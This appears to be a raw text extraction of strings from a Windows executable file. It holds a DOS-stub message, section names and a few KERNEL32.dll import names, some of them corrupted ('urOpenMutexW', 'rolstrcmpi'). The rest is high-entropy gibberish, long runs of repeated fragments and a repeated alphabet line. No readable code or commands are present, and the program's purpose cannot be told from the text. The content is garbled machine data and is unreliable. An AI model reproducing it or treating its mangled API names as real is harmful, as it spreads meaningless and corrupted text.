    
!This program cannot be run in DOS mode.
Rich
.text
`rdata
.data
gfelmge
lkcaqyc
5*aY
!2_N
5yc=
A	w+
@6,nn$1
w0)@f?
@6,nn$1
w0)@f?
@6,nn$1
w0)@f?
@6,nn$1
pnT_
H$)Y
*J	1
3+q3
T$f+
f+f3
3cf+
1=f3
D$f#
 yf+
>ef3
jQ?f
=uBt("`
3{2z
F|%*
tx>>e
jkv%L
SXx0
SGS"3
BE#w
vOD;
D.xX
#w<+
KERNEL32.dll
FlushConsoleInputBuffer
urOpenMutexW
CloseHandle
ConvertFiberToThread
ChangeTimerQueueTimer
AdGlobalFindAtomA
GetSystemWindowsDirectoryW
GetFullPathNameW
rolstrcmpi
giOpenProfileUserMapping
GetNumaHighestNodeNumber
hku	
cRk\
_${^
'2d6
87Hk
w2i1
rv[U
!P@]{
V#~j
]{=Ur
cM\4y
5cES
;.$%e
A{yC
/FCP
[LMk
dt"(
H(UR
Xb3g^
W-v]
P;%b
!z`QU
'%1f0
hmdvQ
OPd0
sux4
pAiS
h4?GeM
e7<7
GSPp1
ORx3Y
/BKA
%~<]
Mlm6
:e"l
!8?2TN
1)PU
w%nY-
\A'U
2jX4,+
ru0ivd
:";bj
+A9x
3D)r=
w))^a
TxiGk
Z$xY
7O`VI
h+W#kz?Q
Ww P
\Cpa
5owt
NE?M-
urOe
AXRy
2cS 
3"<7
mDNd
401j
M;1@
Fs	Tc=H
mH*p
Mb@g
U 	tM
gHw7>
QC7d
	Q~<s_A
4DFj
*z|h
1, E
	nBC
!t.2
!vpl
]mi^
l0a[_
'uK0
[yOV
WffJd
kRZ|;
*w<-
o&ow
Gt-"
9]&H
j'eWo
#S+P,1T
:6U`j
.%JPs
60A{
I]bg$
G0"zJ
SdYv
*zg]
/}. 
nt_;
)0uF
vgxA
E<:p
&;#1
-)%m
'l/^L
FE+$Z
,;i5
vhVi@
X.`D
;vUC
}fI&
=V+A
GfF"c
OBt;6Y
n %}
v=}f
*>e>Lr
^5	@E/A2
Z.Cp
<mN\
9DQ1-Q
!F6H
Le%)oRW
xDQ,
1<`q
P70n
x>|J
@&5@'
S>|<
G9Wt
>&"tsF(7')n*
 _(:
S1r5
h6]_
dP_Dx
h-?+
)VpS
V\g+
-Ni{u
f|;d
-<r/
&OU.
sj,P
3Q2_
//yqw
d'M$Ok`i2
qV?5'
NOg=
)?@+
l}J,
APDeN
4)&wr
*B(&M
y	 QAl(3F
_8FsA
RxL0
B>YN
b[ <
f(B{
t(	i{3
j QI
u0n=
:49"
^/=r
!7Mc
?^A)
tz(U
&~B5y
'	}[
`CH}
!htT	
)u!'
6ab 
x}!B
">a,
!P3~`
G5tS
:'wD
5'dw
[**R
m3P\P
T5kv
#s,Uq}
y,y<6{'oE
bo1%
ii K
L}77<
>L&k
+c&`q
Q`U{K
sHG7
;/hl
3f~:
iZ.:
p$$I
WQ.XbU
$f<|N
rbh{
=);S
7quN
x:S\H.B
dvCv!L
~\!i
okAW
W9rI
R;7z=&
Z^H[
kc64
tV['
+utP
o,o\7
M8|f
&3vZ
_oN-
=\cM
H(8R.
 Oz85
KPmI
xs!WeHM
Y#y{J
N,vj 
P&^,
QW][%
7~O>
rYl@
+UL1
pspQ@s
rSjO
V)9t
)E$B
^iY,
l?yb-
3pgac
	TH'
mADmj
ln{}o[q
bB.e#Mx
YD<_
#+mRxB
m&v-
XMB3
0$(4
x&=_3
x1ae#
:z@3I
&[Z|
9E&,
H[g0
ANaf
7-rm[
q&ni
+T';A
9;yZ
0X@L-T
~lY349v
wN80F
I42B"d
jW&	
j8Pm
-\A7
l7%[
Ei;r
f_nG=
8/0A
^5ot
@g=\
~Lr~
5+M5
>c`)
^)i!Z
6Zpt
o0O{
T|719
9y?un
gv1u
+az$
5}25Y
0}>r
6ugt_
.r^]
Gu7x
,xc7
|R3Gpt
[+%u
}a;k
:i1=
lV5g
%[RN
c~Q[
=xc|
H~91
'vt=o
"aGj
X6Jp
g\^a
"UeJ
/wi^
>o2C
:}n%
(x61)
~kId
i6:V
>&:}J
Q-0z
(N5.
IWO4
M~(5
z'0K@
Nlz? 
-p3/
H+y9/.
bG>C`
q_g	
u6O:
9J$j
jpQ^HP
\?)-
\	9}d
ebYDa
;NNi
#ZFA
7QEc
k,qM
Z~&vJtbM#
J% D
ohz"S7
K^!3
g&hT
K-3p(z
fpQFN
]&-|;
Vuiw
Y~3i60*
lSfy
F+.J 
qx<8w
gX4^
:\sU
}ZE8
|J-;
![3a
.Go|N
vC0-
${CE
gt/\r$\
7QAf"NYES
Myu+
k	t,|
;)OO
TMwO
U(%|
=f(/
(A;$
DU&i
AIA	
q8)b0
+w/O
'lNv
T"ir
mV}B7
+x-n X
r4aD(
4!EH
E}*v
~@-I25
f9En^d
AQc|
bJ_`
RR!)9
varj
$N^4
!?Yh
koH	
sY!G
5';"
]ao	
4{SzC7o
o|Jbz
*Wyg
AWD-
)7~D
H? m
NjE~
 muqj
C4Xu;
bsZ_
PDo%F
|D(WH
Pro]_q
Afv,
YLs+\
!@4w
t6v	
W*>1
<	b>
fF^"
nC:U
7[qv[
	:v|
>#ZR
eO3B
fW'w}
^}"2
$Bbu=
8T#O&
XbmHg
l`c[
krA.
:>L#
YCQ"(_
^%$5"
VeDR<q
2Ya 
6X]KV
(J:J
,6=m,6
x!_9
'H7e`O
[LZS5
+}l)
pn=$
nK@`QI
gm.g
q)f>
R}KJ
f#W ?
cX_R
&_je
5ln<
Q;`[
k=wPm
Q{PG
N1'R
3zdY\
"X) 
	M EB
!K2O0D
bqu((G
?L6t
L^$e
C4[go
Ru;L
jjES"@
%*#7
DW%3,
YkYB
:DL}X3
n|	R%
	]q&_ j
Yo+0$h
3cY@h
:;n*3
j!R<
<s!|>
:K n
?0(?
w?dx
M,<p
B-[Dk
$aat
twb+
h"pe
#r}%
G8`V
L|K(
X~)j"sq
8 Hr^
aI]v9
,Z\?Q
'_Ss
4D	mr
bqQ{A
m`PF
=y7Q<H
!yfF
4Cp.
g3Jnh
nxN"
HJ}/
[VM;
4. n
Pmss
>!q?
T(\G
Gi88&
V>(>
UuHj$
x^8sm
}s|B~
!ijwS
R[Qa
zp) t
KMqh}
5mp|5
V	}[
eK\RcD
olCtc
IcN]37
Vj=&
jjW[m
5DKU
;0!l
}^0?}
ad;R@~"
*06{
vzU%
	m{h
Bu&H/
z3XoH
06p?m[
AiX"
	Tr:
)m{.
5b	j
d}Nq
K2h]
m"K]
UD$M
=gM%
R!SU
qjxj
 8Md_
yd*4
!L>h
Fp>e
b0w,O5B
3*A!
%g"{|&
*\Mq
[]Ehi
l1!]fa	
'+g?
#,).
U*2_
b%g&
D)ki
*~kj
!v1p
.@zG
yZ~;
l{QG
2cNa
ZNkdI
z(?_
R,	 d]
~	ow
%WBbh
8*ME
w:Zp
IrAm
LBmJ
55oc
1(bK
csJ(
`=,a
 TF%
v\54
1(bK
csJ(
1lDe
y*N1
d!Q!
y[aEa4
he<=L
}9FG
X.|k
#sJ(
D&~87"
8N	B
)b	M
?e&TU
:&$@}
r&$@j
i[Xt
r/A@(;fT
!7k"
-KWD
LJxG
j@Kg
qn a
UE^a
|>rg-"f
h]>K
\]Ym
l$vL!Nqp
Q)G	
m!f[
b'O>
6 eB
Uib_*D|
K{Q~sE
#IMHY
d	Dp
I0__&
V8{R
Ea=|
JgS+6jx
tGBr
%Q!f
tW%r-
2q3	
K%>z*pz0
tW-3
vhCk
FH:L
PDT"
v/{D&<ba
u5_2#
qQ	=
9./`~
|9)1
Tib\
Z*AC
/tAs[
:z;R
`J*	
rlKA
?egN
$M6}
OS3S
y|O#
efM+
U\rt
Q.x&pz
B.l|
7Hakq
+pzu
x}pd
?egR
'$@B
Tjb\
,h|S
($Pz
`&pz
tW%r
=_oP
@9)1
\cAd
 ?TOv"
o^Ho
>eto
8u{4
Y"%Z
9x=K
>5Gw4
+`jue
6}Gd
T>8E
gv^ji
h.8z 
^U~N
i)!%|
*{/{{
(>{W
q&Ou
pRzH
M`7B
ZwZ=
=op8
fy(H?w
J`;I
":s,BD,
k'y[
*$B6
p@tA
^Zxd"
^\s<
Og 9
HSi!s
*>e9o
r0BFF
skvXr
^gBQ
 =	(
36hK
eR1'I@YO
0z[-
cSox
q@/zK
.T^zQ
D0}Y<
qT<Q
uR:M
3eJ/L
rK"-
\b3|
|	6_
bc}T/
bw{#
agw(
1^#I
1CSM9
2Z[@
EmI'
"AGD
<^+p
"o:U
,Jm*
'.C[
Ue"U
H	.s
(EFz
z]JMz
.WCc
S@bBF^
{vJg:
>uEe
 oPx
^9.i
=hSCZ
W0_.a
U]%{
1V1`
'*Ol
D)W@m=
GCWt
NCgz1:W
8z9sp
I|}7
})Av
bUik
1e>f*
Y}VY4u
z;2g
	ndW
B1vl
1moS
PyL2)ywD
Ycpu
`p$rc{
agw(
agw(
*~oD
_+C%><
(H>l
@y!<U
LqH(
lu/6
b"-F
S/GJ
s1: 
Lsi6!
!8/LA
!Bf;
agw(
4MM;)
oR6&
3'L2
2'E6
2'E6
Ix%FY}c
9NWH
*Q=W#
2'E6
-BbGc
HL~*o
2'E6
-GLic
9w)7
>HGo
Q!Pg
2'E6
_civ
2&%v
lIHM
B-mC
Ht, o-
BD<1%5
f-m6
ln9Z9
2;w#
eB9ZB
22_#
bG9[E
@RF]L
3lw*
cFu#
Z|kz
-@Plc
9u :
N\FG
pUo%
]-x+
9CQO
UGFEW
HtMfo-
S-x*
9CPN
H	*-o,
4-uU
9DRR
<o	L
&#9U
rwwF
>w@{
2&([
)"9I
|M;)
*,oT
r)pC
2'E6
|M;)
,5lT
|L;)
v' 6
|(;[
dx9q
A'k6
|$;F
T'16Xj
|$;F
2'E6
/%\*
{KyE
s_	$
?[?R
a'w(
\+m*
*Ni^$r
`y.B!
yL*z
0Epf
\o$ag
ITwrWE	
k0^k}*b
$jTV
Aoo%
)r8|
agw(
Lqh'
tz	V
XB4G
=yPAI.o
$(Jys
79b&J
L\z`F@^
l.v:
\3IRL
</^:
QCYp
+D(b/
kBI=
EfUV
Ep+a
v<FZ$
wrSK 2
jt}x
h|@Iyy
H1jm)
m4@i
|azW_	vql
%(md
}wChr
`aX)
Iu|	_
H-Mdu{
%pR&
3[ua-
fu{g
|M;)
8CBJ
"?hOn
AgPxa`
\kD.
E*d1
p;WR4HB
4LxU
>}bh\
PwmF
NF~8
Yj &6
'58C
p}jkp
:Q:X/e
(U^f
K]^P
VT#3F
Ug/"
NbW)
93'	
tupw
4\xU
f`p/
4\xU
f`p/
4\xU
f`p/
4\xU
f`p/
H xU
`J5i
3'D6
qx0q
K'76
|(;Z
2'p6
|!;L
2'E6
|M;)
2'E6
|M;)
KTUQ
Ky{T
MnTg
^_u 5
!_B/x
	EH;)
|vy. 
Yw~X
M$8G
 _B[x
8?*c
5M*|
X!_B
-:5G_
vZbJ
3+\f
hlS)
'd$y]D R
\.T\
0'E:
|M;)
v4\6z
-&kCQ4R
wL7"R3
T(jx
QZjD
ugiG
EB"@
)le7p
mJWhv}
yXfE
(6m8r
zD6e-:
a_oJ
;xZ	
7l>	
~d}U
^w4\NJ
WRv)
jwIZUUO;)
J61:
T|T2G	
40i'
,)xP
?!zm5
:9^W
5Hav
[H92*
xYh+
oNIq
nFj*R
Le+|
|M;)
!0jA
nBx9
c\fy
Z:j'
YHc3l
r3tHb5
]^'G`
8!p*
N%Br
):jq
@mCi
[=}V
^9")
y$j#
{u)d
-Pxm@
y7.%
ZcqF}g
Z:jn
+:jq
mCi*
`cqF}g
Z:jn
+:jq
mCi*
`cqF}g
Z:jn
+:jq
mCi*
`cqF}g
Z:jn
+:jq
mCi*
`cqF}g
Z:jn
&Mfy
mEE4
LF}g
(`pZ
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
2'E6
|M;)
+\x	u
V |)
^5Xis
Yx.C
'!XU<(n
yIsL\rg
dL$KX
p%wW
he0Am!
tBg]=-;
?4rrV
/(I-
]gRU
Drgn:
=0I?
<NEn
Z/Pu
/f\?Zdx
<_6T
Occ,aJ
E.&0
'MCL
ADTn
0YZ-,PX
Ft4]
f;},-
w~c!
 D~9J
zGkR
"3J4Sms
r(5>
%2" 
>`$P
;tBYy
\	vS
.{i5
Nrg`
R/_`
j5/5
KERg
\4nl
p%e-
tOo2!
3v:I
h|`7
[,}vv>4
w4;T
Zd2J
Q/vw9,
hvHJ
pB?V
tN>At
'TV5B
TVz^
y@\x
^m.1
ZTRt
E4>lA
/<?0=
'K@%
TkkJ
#?=u
14".i
OpQ._'\
IJ7"
 YCO
4Be8
C=k:
-Yu2
2-Q6
-/'0
|gt~T
beN)
{"+A8Xc
rs~$Mw&
GbbR
)	GF
#@Wb
_Zt|!
[;o&
ncS5J
@{C+
/_=#
%_:>HB
PbtQL&
L`"N
+30{
_UVYs
Q1UM
<0??XS
;Eq5
+[dmO
\;}G
5TTi
aq/i
CxKiJ$8
D0fm+r4
6w57
1Rz{
r2M$
aJ4~B
nw6?U}X
v7t 
t@l!
f\ueX> 
D8Q+
y}*.
]yncaH
[|Ox
qNpE
f9#g
D]QR
h'm3
C:UB
l5gr
&*S9
2[S3
+0%9HG6
6.Y`
E#@Xs
>+./
";g?o?27
gTD\=|H
!T&{
>VdBL
(g=W
'St85
IcqJr
PT:\
4oV">
 s'@dPtk
xmGF
S*iL%
1O)dhyQ
SL:@
,<{Z
3r &
fQ2:
QCDT
Y0XV
X\SC
fLlI
i`hQ
>d	D8
wg.d#SJ
`~p$
We|*
"7|yU*
$-PGt
X*$@
pBt"
C{B5
k1,,=
TYbv
|PM'
-EENz*
W+"Fg
BnJ	u
G0Nu1
L%;?
	gwB
zb,t
&x&3
cB~	
u^;	
kVM].
v{L$^)
 rIzt
HYfu
m>V7
O0dY
^K{D{
ut g
J8@D
.GLf@
'7xt
 JJ|u
qjtm
d*8"
eeZ5
NCug
U*B:;
OikI+
d@+$
&D$@h
l8km
W(bc
S&;J-
/sVj
7C~N
/0Kb
&_.[
X}J2
>ov%
qRq&
3?AU
_xo|
^0m	b
v=jX
0t]]m
h9bA
IB*/
]RYj
\9fv
	:x%
t]Tx
F%G*
C/EiK
XDa'>6
*WCh
P5Jj
uiz4
s`=BHtd*
g)5F
juYi
([YV
F%XB
m_9lWX
UOtJ
}Qv? <j
Gyh[vy
7U*LK
-@NT|p3
0PA_NI
/v#Z
!vU5
E30>0
A:,q
1#Uo|
\|=A
'`"4$
Nr)V
	lna{
{MK2
rMo_.L
Qd%G
-9N6}
/nU(
%QB@
H_=z
[_:/>0
zjAo
hM^I
,X!3
?EN!
tsJDz6j
^bucB
}PMshU
{0{u
NQX8
yM@m
}%bi
_xplZ
Bd=*
i!>r
g +(.$
wQp.
}eE!
rWAP
@ih[
&xM~
cxN?F
 .if0
x~CN
hT\4/c
8mQGD
LkpY
0XKt
H;I"
_wy#h
&D4.
JB*=
,yp?
G@@*
fwmO
8.n\pP
=n6>{
H_nw
1@!f`
Zt_v
,\Q;R
G-=,
8H'V
R{u6'y.
B/`w
NP7"(3
l<rPm
~U4a
JT4sO]
1x^L
TFVi8
.qi;
	@5l^
x	=4
0}v0p
)`E?
g$	kj
n_Mm
^G6j
/j#XF]?o
o:cr
@dI4
5!Ghn
P)"Z
/%H8nw
8'%y
j?MT
^xr#
C'#9Y
kZ!k
vdAO
n96+
g|)y
WBF]R
3	N2
Q y'#
HU$S%
AwHumwG
YM8	x
XFKN!
OkMz
D!,"&r(
X JF
~NE7
57)g
%H.N
DY0/
p0]6a
Za}*Lo
_[pJ(
FE\He
bsXV
WR+cl
'XEl
?3|}b@
\(&`
nKY 
ppvp
H}cn
~|,9
#D<+
9g):
_<>p
Wdx~f.
$q^}y|j9
eF|D
UOsU;
7xK H60@
YD4so
]qq8
PY)F
c\$U
gpVq
B\8ga
jkQk
EQRSH#3
"zbjZ
X$2I
^,E*B
`W&n
sG$\|
^QDf
2~ZrSC
i5dp
0H=f
4muE
Iw>+`
bplJ
LRQe
_x  
U~pF!
}5%rQ)
#DhG
re"W
Nf>e
.C^Px
l^tD
!1Ltd
3\>>8m*
8S8L0
nrel
mlb(
'0bV
YqKZouE
:\t>
xcuK
'-W$
7^7KI>
lM#_
QqDhoT
-U/&
\jBQ1
(8O#u
6oz 
*dw>
a>KF
III	UWY.``d`cdh
<>?o
egkKnpt
+//|
fhi&llp
#$$w
hij;mlm
npq;oll
ttv$nmn
mrv>sjc
z()(
B000
quz!vlf
;###
\CCD
[_cY
vZZZ
999roop
NNN'
[[Z5
ZYY7
G,.,
][]<
^^^>
dgj?
zws[
fjnB
fjlF
fijG
E?>>
gjlH
dgjK
begN
135l
dgiO
)666
eggP
ADGu
eeeS
gffV
BDE=
gfcV
SVYN
gdbW
Z\`F
igdZ
]`c$
ljf^
afi9TW[
nli_
Rnv}8dls
ojg`
nhgg
niek
okjm
onon
pqpu
noox
rrpy
qqqz
qpp~
Xxxx
dNNN
uuu	wuu
EGC	
bvuu
$oon
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D5K
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D[m
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
4Y:D
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DWx
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:Dq@
Babcdefghijklmnopqrstuvwabcdefghi
W#\	
4X:D
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DzQ
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D^t
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DdA
Babcdefghijklmnopqrstuvwabcdefghi
:DYl
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D>.
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DVG
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DDu
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D";
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D)a
Babcdefghijklmnopqrstuvwabcdefghi
:DTg
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DAh
Babcdefghijklmnopqrstuvwabcdefghi
:D+n
:DDu
:DDu
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D)a
Babcdefghijklmnopqrstuvwabcdefghi
:D)a
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D+n
:DDu
:Dzs
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DT!
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D)a
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:Ds!
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DO]
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
r:Db
Babcdefghijklmnopqrstuvwabcdefghi
WZU	
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D[m
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:DWx
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:Dq@
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D+n
Babcdefghijklmnopqrstuvwabcdefghi
:DiL
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
:D+n
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
Babcdefghijklmnopqrstuvwabcdefghi
